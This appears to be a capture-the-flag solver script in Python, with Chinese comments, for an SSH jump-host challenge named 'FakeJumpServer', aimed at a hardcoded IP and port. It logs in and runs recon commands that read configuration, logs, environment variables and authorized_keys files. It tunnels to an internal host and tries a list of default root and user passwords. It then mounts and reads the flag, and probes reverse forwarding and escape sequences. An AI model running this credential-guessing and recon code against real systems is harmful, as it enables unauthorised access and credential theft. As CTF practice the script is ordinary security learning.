import paramiko
import socket
import time
import sys
import threading
import hashlib

"""
重要发现：
1. 172.17.0.1支持 publickey 和 password 认证
2. ctf/123456 不能登录172.17.0.1

FakeJumpServer攻击的核心思想：
- 跳板机伪造目标服务器
- 当用户通过跳板机连接时，跳板机返回自己的公钥
- 用户输入密码后，密码被跳板机捕获

在这个场景中：
- 如果有人使用 ssh -J ctf@challenge:55300 user@localhost
- dropbear会拦截到localhost的连接
- 返回自己的公钥
- 捕获用户的密码

问题是：这些捕获的密码存储在哪里？

让我检查：
1. dropbear是否记录了认证尝试
2. 是否有某种"凭据转储"功能
3. 环境变量中是否有密码

另一个思路：
也许FakeJumpServer不是关于捕获密码，
而是关于SSH的某种特性可以绕过认证？

比如：
- SSH Agent Forwarding
- SSH证书
- 主机密钥验证绕过
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def check_dropbear_logs():
    """检查dropbear日志和配置"""
    print("[*] 检查dropbear相关信息")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    commands = [
        # 检查进程
        "ps aux 2>/dev/null | head -20",
        
        # 检查dropbear配置
        "cat /etc/dropbear/* 2>/dev/null",
        
        # 检查日志
        "cat /var/log/messages 2>/dev/null | tail -20",
        "dmesg 2>/dev/null | tail -20",
        
        # 检查环境变量（可能有密码）
        "env | sort",
        
        # 检查/proc
        "cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '",
        
        # 检查是否有authorized_keys
        "cat /root/.ssh/authorized_keys 2>/dev/null",
        "cat /home/*/.ssh/authorized_keys 2>/dev/null",
    ]
    
    for cmd in commands:
        try:
            stdin, stdout, stderr = ssh.exec_command(cmd, timeout=5)
            result = stdout.read().decode() + stderr.read().decode()
            if result.strip() and "Directory tree" not in result:
                print(f"\n{cmd}:")
                print(result[:500])
        except Exception as e:
            pass
    
    ssh.close()

def try_different_users_on_ubuntu():
    """尝试不同用户登录Ubuntu"""
    print("\n[*] 尝试不同用户登录172.17.0.1")
    
    jumphost = paramiko.SSHClient()
    jumphost.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jumphost.connect(HOST, PORT, USER, PASSWD)
    
    jumphost_transport = jumphost.get_transport()
    
    # 常见用户名和密码组合
    credentials = [
        ("root", ""),
        ("root", "root"),
        ("root", "toor"),
        ("root", "password"),
        ("root", "123456"),
        ("root", "admin"),
        ("ubuntu", "ubuntu"),
        ("ubuntu", ""),
        ("ctf", "ctf"),
        ("flag", "flag"),
        ("admin", "admin"),
        ("user", "user"),
        ("test", "test"),
    ]
    
    for username, password in credentials:
        try:
            # 创建隧道
            tunnel = jumphost_transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=5)
            
            # 创建SSH连接
            target_transport = paramiko.Transport(tunnel)
            target_transport.start_client(timeout=10)
            
            try:
                if password:
                    target_transport.auth_password(username, password)
                else:
                    target_transport.auth_none(username)
                
                print(f"[+] 成功! 用户: {username}, 密码: {password}")
                
                # 执行命令获取flag
                channel = target_transport.open_session()
                channel.exec_command("id; sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt 2>&1; cat /mnt/flag 2>&1; cat /flag* 2>&1")
                time.sleep(2)
                
                output = b""
                while channel.recv_ready():
                    output += channel.recv(4096)
                print(f"输出:\n{output.decode()}")
                
                channel.close()
                target_transport.close()
                tunnel.close()
                break
                
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                if "Authentication" not in str(e):
                    print(f"  {username}:{password} 错误: {e}")
            
            target_transport.close()
            tunnel.close()
            
        except Exception as e:
            pass
    
    jumphost.close()

def monitor_for_connections():
    """
    监控是否有自动化进程尝试连接
    
    思路：设置反向端口转发，看看是否有其他进程尝试连接
    """
    print("\n[*] 监控连接尝试")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 请求反向端口转发到某个端口
    try:
        # 让dropbear转发到一个随机端口
        port = transport.request_port_forward('', 0)
        print(f"[*] 反向端口转发已建立: {port}")
        
        # 等待一段时间看是否有连接
        print("[*] 等待30秒看是否有连接...")
        
        def handler(channel, src_addr, dest_addr):
            print(f"[!] 收到连接! src={src_addr}, dest={dest_addr}")
            try:
                data = channel.recv(4096)
                print(f"[!] 数据: {data}")
            except:
                pass
            channel.close()
        
        transport.accept = handler
        
        time.sleep(30)
        
        transport.cancel_port_forward('', port)
        
    except Exception as e:
        print(f"错误: {e}")
    
    ssh.close()

def explore_ssh_escape_sequences():
    """
    探索SSH转义序列
    
    SSH有一些内置的转义序列，如 ~C（打开命令行）
    这些可能会有用
    """
    print("\n[*] 探索SSH转义序列")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 打开一个shell
    channel = transport.open_session()
    channel.get_pty()
    channel.invoke_shell()
    
    time.sleep(0.5)
    if channel.recv_ready():
        print(f"初始输出: {channel.recv(4096)}")
    
    # 发送转义序列
    escape_sequences = [
        "\n~?\n",  # 帮助
        "\n~#\n",  # 列出转发
        "\n~C\n",  # 命令行
        "\n~&\n",  # 后台
        "\n~.\n",  # 断开（小心！）
    ]
    
    # 只测试帮助和列出转发
    channel.send("\n~?\n")
    time.sleep(1)
    if channel.recv_ready():
        print(f"~? 输出: {channel.recv(4096)}")
    
    channel.send("\n~#\n")
    time.sleep(1)
    if channel.recv_ready():
        print(f"~# 输出: {channel.recv(4096)}")
    
    channel.close()
    ssh.close()

def test_hostbased_auth():
    """
    测试基于主机的认证
    
    如果dropbear配置了基于主机的认证，我们可能可以利用它
    """
    print("\n[*] 测试基于主机的认证")
    
    jumphost = paramiko.SSHClient()
    jumphost.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jumphost.connect(HOST, PORT, USER, PASSWD)
    
    jumphost_transport = jumphost.get_transport()
    
    try:
        # 创建隧道到172.17.0.1
        tunnel = jumphost_transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=5)
        
        # 创建SSH连接
        target_transport = paramiko.Transport(tunnel)
        target_transport.start_client(timeout=10)
        
        # 获取服务器信息
        server_key = target_transport.get_remote_server_key()
        print(f"服务器密钥: {server_key.get_name()}")
        
        # 检查服务器是否支持hostbased认证
        try:
            # auth_none会返回支持的认证方式
            target_transport.auth_none("root")
        except paramiko.BadAuthenticationType as e:
            print(f"支持的认证方式: {e.allowed_types}")
            
            if "hostbased" in e.allowed_types:
                print("[!] 服务器支持hostbased认证!")
            if "keyboard-interactive" in e.allowed_types:
                print("[!] 服务器支持keyboard-interactive认证!")
        except Exception as e:
            print(f"错误: {e}")
        
        target_transport.close()
        tunnel.close()
        
    except Exception as e:
        print(f"错误: {e}")
    
    jumphost.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] FakeJumpServer深度分析")
    print("="*60)
    
    check_dropbear_logs()
    
    print("\n" + "="*60)
    test_hostbased_auth()
    
    print("\n" + "="*60)
    try_different_users_on_ubuntu()
    
    print("\n" + "="*60)
    explore_ssh_escape_sequences()
